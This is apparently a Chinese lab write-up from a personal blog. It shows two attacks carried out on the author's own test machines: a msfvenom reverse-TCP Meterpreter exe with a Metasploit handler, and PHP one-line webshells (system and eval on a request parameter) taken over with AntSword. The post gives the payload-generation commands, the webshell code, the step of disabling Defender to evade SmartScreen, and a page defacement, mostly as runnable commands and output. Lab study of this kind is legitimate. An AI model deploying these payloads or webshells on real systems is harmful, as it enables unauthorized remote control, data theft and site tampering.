---
layout: post
title: "远程控制：exe 木马和一句话木马"
date: 2026-11-10
categories: 实验
---

这个实验做了两件事，分别对应两个层面的控制。

实验一是在操作系统上放一个自己生成的小程序，让它主动连回 Kali，我在 Kali 上给它发命令。实验二是往网站目录里放一个 PHP 文件，通过浏览器访问它来执行命令，再交给蚁剑接管。

被控端和网站都是自己的：Windows 是本机，网站是我自己在 Kali 上起的 Apache，里面没有真实数据。

## 环境

| 项目 | 说明 |
|---|---|
| 攻击机 | Kali 虚拟机，`192.168.200.131` |
| 被控端 | 本机 Windows 11 |
| 网站 | Kali 上的 Apache，`/var/www/html` |
| 工具 | msfvenom、Metasploit、蚁剑 |

---

# 实验一：exe 木马

## 先确认 Kali 的地址

```bash
ip a | grep inet
```

![图1：Kali 的地址是 192.168.200.131](截图/01.png)

这个地址在后面的命令里要填好几次，填错就连不上。

## 生成木马

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.200.131 LPORT=5000 -f exe -o ~/payload.exe
```

参数的意思：`-p` 是选载荷类型，`LHOST` 是让被控端连哪个地址，`LPORT` 是连哪个端口，`-f exe` 是输出成 exe，`-o` 是保存路径。

```
Payload size: 354 bytes
Final size of exe file: 7168 bytes
Saved as: /home/kali/payload.exe
```

![图2：生成完成，文件 7168 字节](截图/02.png)

生成出来的文件只有 7 KB。这么小的原因是它里面没有完整功能，只有 354 字节的引导代码，作用是连上 Kali，然后把后面收到的东西加载进内存执行。真正的功能模块是连上之后才发过去的，有 195 KB 左右。

连接方向是「被控端连出来」，不是「攻击机连进去」。防火墙一般只限制进来的连接，不管出去的，所以这样更容易通。

## 让 Windows 能下载到它

Kali 上起一个临时的网页服务：

```bash
cd ~ && python3 -m http.server 8000
```

终端显示 `Serving HTTP on 0.0.0.0 port 8000` 就成功了。这个窗口不能关，关了服务就断了。

## 下载被拦住了

按常理是在浏览器里打开 `http://192.168.200.131:8000/payload.exe`。结果 Edge 直接拦下来，提示「无法下载 - 检测到病毒」。

![图3：浏览器直接拒绝下载](截图/03.png)

这是 SmartScreen 在工作。它不看文件内容，看的是信誉：有没有签名、多少人下载过、哈希在不在白名单。新生成的文件这三样都不满足，就直接拒。

这里我是把 Defender 的实时保护临时关掉，才下载成功的（实验做完记得开回来）。文件存到 `C:\lab\payload.exe`，这个目录是我自己建的，放在桌面或下载文件夹里也一样。

## 主控端开始监听

```bash
msfconsole
```

启动后依次输入：

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.200.131
set LPORT 5000
exploit
```

`multi/handler` 不攻击任何目标，只是在本地开一个端口等着连进来。

看到这一行就是监听起来：

```
[*] Started reverse TCP handler on 192.168.200.131:5000
```

![图4：监听已启动](截图/04.png)

这里填的 payload、LHOST、LPORT 必须和生成木马时完全一样，否则连上了也握手失败。

## 运行木马

在 Windows 上双击 `C:\lab\payload.exe`。

Kali 那边会刷出：

```
[*] Sending stage (199238 bytes) to 192.168.5.6
[*] Meterpreter session 1 opened (192.168.200.131:5000 -> 192.168.200.1:2570)
meterpreter >
```

![图5：会话建立](截图/05.png)

出现 `meterpreter >` 就说明连上了。验证一下：

```
meterpreter > sysinfo
Computer    : LFW-BATTOR
OS          : Windows 11 (10.0 Build 26200)
Arch        : x64

meterpreter > getuid
Server username: LFW-BATTOR\35045

meterpreter > shell
C:\Windows\System32>
```

![图6：系统信息、当前身份和系统命令行](截图/06.png)

`getuid` 显示的是运行木马的那个账户。这次是管理员账号双击的，所以直接拿到管理员权限；换成普通用户双击，就只有普通用户权限。

`screenshot` 能在被控端截屏，`shell` 能落到系统命令行。到这一步，被控端上能做的事和坐在它前面的人差不多。

## 提交沙箱

把样本上传到微步云沙箱，看它的判定。

结果是判定为恶意，类型是木马，引擎检出数 15 到 28 之间。

![图7：沙箱判定为恶意木马](截图/07.png)

## 实验一小结

流程是：生成木马、提供下载、主控端监听、运行、拿到会话。

中间卡了一次：浏览器下载被 SmartScreen 拦，最后是临时关掉 Defender 的实时保护才拿到文件。

---

# 实验二：一句话木马

## 这个实验要做什么

实验一是在操作系统上放木马，实验二换一层，改成在网站目录里放一个文件。

原理很简单：网站是用 PHP 写的，如果我能在它的目录里放一个 `.php` 文件，里面写一句「把参数当代码执行」，那以后访问这个文件时带上参数，服务器就会执行我给的代码。这种东西叫一句话木马，也叫 webshell。

要打的网站就是我自己 Kali 上的 Apache。

## 起 Web 服务

```bash
sudo systemctl start apache2
sudo systemctl status apache2 --no-pager | head -5
```

看到 `active (running)` 就行。

## 写木马文件

```bash
echo '<?php system($_REQUEST["cmd"]); ?>' | sudo tee /var/www/html/shell.php
echo '<?php @eval($_REQUEST["cmd"]); ?>'  | sudo tee /var/www/html/antshell.php
```

两个文件只差一个函数名，但行为完全不同：

| 文件 | 函数 | `cmd` 参数被当成什么 | 配什么工具 |
|---|---|---|---|
| `shell.php` | `system()` | 系统命令 | 浏览器 `?cmd=id` |
| `antshell.php` | `@eval()` | PHP 代码 | 蚁剑 |

`@` 是错误抑制符，避免报错信息把文件路径暴露出来。`eval()` 的意思是把字符串当代码执行。

![图8：antshell.php 的内容，就一行](截图/08.png)

## 改一下目录权限

```bash
sudo chown -R www-data:www-data /var/www/html
```

`/var/www/html` 默认属主是 `root`，而 Apache 是用 `www-data` 这个账号跑的。不改的话，后面用蚁剑写文件会报权限拒绝。

## 先在浏览器里验证

```
http://192.168.200.131/shell.php?cmd=id
```

返回：

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

![图9：页面上直接输出 id 命令的结果](截图/09.png)

## 用蚁剑接管

打开蚁剑（AntSword），右键「添加数据」，填三项：

| 字段 | 填什么 |
|---|---|
| URL | `http://192.168.200.131/antshell.php` |
| 连接密码 | `cmd` |
| 编码 | 默认 |

连接密码就是 `$_REQUEST["cmd"]` 里那个 `cmd`，不是文件里的内容。

双击刚加的这条，能进到文件管理界面就说明连上了。

![图10：蚁剑连接成功](截图/10.png)

这里我第一次连的是 `shell.php`，蚁剑报「返回数据为空」。原因是蚁剑发过去的是 PHP 代码，而 `system()` 只会把参数当成系统命令去执行，代码它不认。换成 `eval` 版的 `antshell.php` 就正常了。

## 虚拟终端

右键目标 → 虚拟终端，可以直接敲命令。我敲了 `whoami`，返回 `www-data`，说明命令是以 Web 进程的身份在跑。

![图11：虚拟终端里执行 whoami，图中的红字就是下面要说的 dash 报错](截图/11.png)

第一次打开报 `Syntax error: ";" unexpected`。原因是 Kali 里 `/bin/sh` 链到的是 `dash`，蚁剑拼的命令里有些语法 dash 不认。改成 bash：

```bash
sudo ln -sf /bin/bash /bin/sh
```

重开一个终端就好了。

## 文件管理

在文件管理里能看到整个网站目录，可以上传、下载、编辑、删除。

![图12：蚁剑的文件管理界面](截图/12.png)

我新建了一个 `hacked.txt`，写了几行字，用来验证确实能写入。

![图13：编辑文件](截图/13.png)

![图14：保存后重新读取，内容在](截图/14.png)

## 篡改首页

最后改了一下首页。把 `index.html` 的内容替换成一行红字：

```html
<h1 style="color:red">HACKED BY ANTSWORD</h1>
```

保存后刷新 `http://192.168.200.131/`，页面变成了这句话。

![图15：首页被改成 HACKED BY ANTSWORD](截图/15.png)

文件大小从 10703 字节变成 10764 字节，多了 61 字节。

## 总结

两个实验分别在两个层面拿控制权：实验一在操作系统上，靠一个 exe 主动连回来；实验二在网站目录里，靠一个 PHP 文件接收代码。前者要过杀软和防火墙，后者要网站有文件写入权限。

几点想法：

- **7 KB 不是因为功能少。** 里面的 354 字节只是引导代码，负责连回 Kali，真正的功能模块有 195 KB，连上之后才下发进内存。静态扫描只能看到这小半截，所以按特征查很难查到东西。
- **SmartScreen 看的是信誉，不是内容。** 有没有签名、多少人下载过、哈希在不在白名单，这三样新生成的样本都不满足。它连文件都没仔细看就拒了，所以最后是临时关掉实时保护才拿到文件。
- **用反向连接，是被防火墙逼出来的选择。** 防火墙一般只挡入站，不管出站，所以「被控端连出来」比「攻击机连进去」更容易通。
- **`system()` 和 `eval()` 只差一个函数名，行为完全不同。** `system()` 把参数当系统命令执行，浏览器 `?cmd=id` 就能用；`eval()` 把参数当 PHP 代码执行，蚁剑发的是代码，所以连 `system` 版会「返回数据为空」。
- **一句话木马的体积小，正是因为里面什么都没有。** `antshell.php` 只有 30 多个字节，功能全在访问时传进去的参数里。没有固定特征，静态查杀就很难按内容抓到它，这也是 webshell 常见的原因。
- **蚁剑/终端的小毛病多半是系统环境问题。** Kali 的 `/bin/sh` 指向 `dash`，蚁剑拼的命令里有些语法 dash 不认，报 `Syntax error`；网站目录属主是 root，Web 进程写不进去。这两类问题跟漏洞本身无关。

遇到的问题：

| 现象 | 原因 | 解决 |
|---|---|---|
| 浏览器下载提示「检测到病毒」 | SmartScreen 按信誉拦截 | 临时关掉 Defender 实时保护，装完再开回来 |
| 蚁剑报「返回数据为空」 | 连的是 `system` 版，蚁剑发的是 PHP 代码 | 改连 `eval` 版 `antshell.php` |
| 蚁剑终端 `Syntax error: ";" unexpected` | `/bin/sh` 是 `dash` | `sudo ln -sf /bin/bash /bin/sh` |
| 文件管理写不进去 | `/var/www/html` 属主是 root | `chown -R www-data:www-data` |

---

## 用到的命令

- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=本机地址 LPORT=端口 -f exe -o 文件名`
- `python3 -m http.server 8000`：临时起一个下载服务
- `use exploit/multi/handler`：只监听，不攻击
- `echo '<?php @eval($_REQUEST["cmd"]); ?>' | sudo tee 路径`：写一句话木马
- `sudo chown -R www-data:www-data /var/www/html`：让 Web 进程能写文件
- `sudo ln -sf /bin/bash /bin/sh`：把默认 shell 换成 bash
